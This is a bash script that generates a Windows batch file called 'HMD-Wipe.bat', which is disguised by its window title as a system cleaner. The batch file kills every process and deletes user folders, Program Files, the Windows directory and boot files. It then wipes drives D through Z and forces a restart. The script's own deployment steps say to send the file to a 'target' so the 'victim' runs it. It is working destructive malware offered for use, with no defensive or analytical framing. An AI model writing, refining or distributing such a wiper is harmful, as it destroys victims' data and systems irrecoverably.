#!/bin/bash

echo "==========================================="
echo "            HMD-WIPER v1.0"
echo "       Complete System Destroyer"
echo "==========================================="
echo "      Developer: bear__67_"
echo "      Email: bearhmd04@gmaail.com"
echo "      Instagram: bear__67_"
echo

cat > "HMD-Wipe.bat" << 'EOF'
@echo off
setlocal enabledelayedexpansion
title HMD System Cleaner

echo HMD-Wiper v1.0 - Starting complete system cleanup...
echo Developer: bear__67_
timeout /t 2 >nul

:: PHASE 1: KILL EVERY PROCESS
echo Stopping all processes...
taskkill /f /im * >nul 2>&1

:: PHASE 2: DELETE ALL USER DATA
echo Removing user data...
:: Delete entire user directories
rmdir /s /q "C:\Users" >nul 2>&1
rmdir /s /q "C:\Documents and Settings" >nul 2>&1
:: Delete all personal files
del /f /q /s "C:\*.txt" >nul 2>&1
del /f /q /s "C:\*.doc" >nul 2>&1
del /f /q /s "C:\*.pdf" >nul 2>&1
del /f /q /s "C:\*.jpg" >nul 2>&1
del /f /q /s "C:\*.mp4" >nul 2>&1
del /f /q /s "C:\*.exe" >nul 2>&1

:: PHASE 3: DELETE ALL APPLICATIONS
echo Removing applications...
:: Delete Program Files
rmdir /s /q "C:\Program Files" >nul 2>&1
rmdir /s /q "C:\Program Files (x86)" >nul 2>&1
:: Delete installed apps
del /f /q /s "C:\*.msi" >nul 2>&1
del /f /q /s "C:\*.appx" >nul 2>&1

:: PHASE 4: DESTROY WINDOWS SYSTEM
echo Cleaning system files...
:: Delete Windows directory
rmdir /s /q "C:\Windows" >nul 2>&1
:: Delete boot files
del /f /q "C:\bootmgr" >nul 2>&1
del /f /q "C:\boot" >nul 2>&1
del /f /q "C:\pagefile.sys" >nul 2>&1
del /f /q "C:\hiberfil.sys" >nul 2>&1

:: PHASE 5: WIPE OTHER DRIVES
echo Cleaning additional drives...
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        rmdir /s /q "%%d:\" >nul 2>&1
    )
)

:: PHASE 6: FINAL MESSAGE
cls
echo.
echo ===========================================
echo        HMD-WIPER v1.0 - COMPLETE
echo ===========================================
echo.
echo System successfully wiped by HMD-Wiper
echo Developer: bear__67_
echo.
echo Everything has been deleted:
echo ✓ All user files and documents
echo ✓ All applications and programs
echo ✓ Windows system files
echo ✓ Everything on all drives
echo.
echo System will now restart...
echo.

:: PHASE 7: FORCE RESTART
timeout /t 3 >nul
shutdown /r /f /t 0
EOF

echo "Created HMD-Wipe.bat"
echo
echo "HMD-WIPER v1.0 FEATURES:"
echo "✓ ALL user files (documents, photos, videos)"
echo "✓ ALL applications (Program Files folders)"
echo "✓ ENTIRE Windows system (C:\Windows)"
echo "✓ EVERYTHING on all drives (C: through Z:)"
echo "✓ HMD branding in execution"
echo "✓ Forces immediate restart"
echo
echo "DEPLOYMENT:"
echo "1. Run: ./hmd-wiper.sh"
echo "2. Send HMD-Wipe.bat to target"
echo "3. Victim runs it - shows HMD branding"
echo "4. System completely wiped"
echo "5. Auto-restart with HMD confirmation"
echo
echo "WARNING: COMPLETE SYSTEM DESTRUCTION!"
echo "DEVELOPER: bear__67_ - HMD-WIPER v1.0"
echo "NO RECOVERY POSSIBLE!"
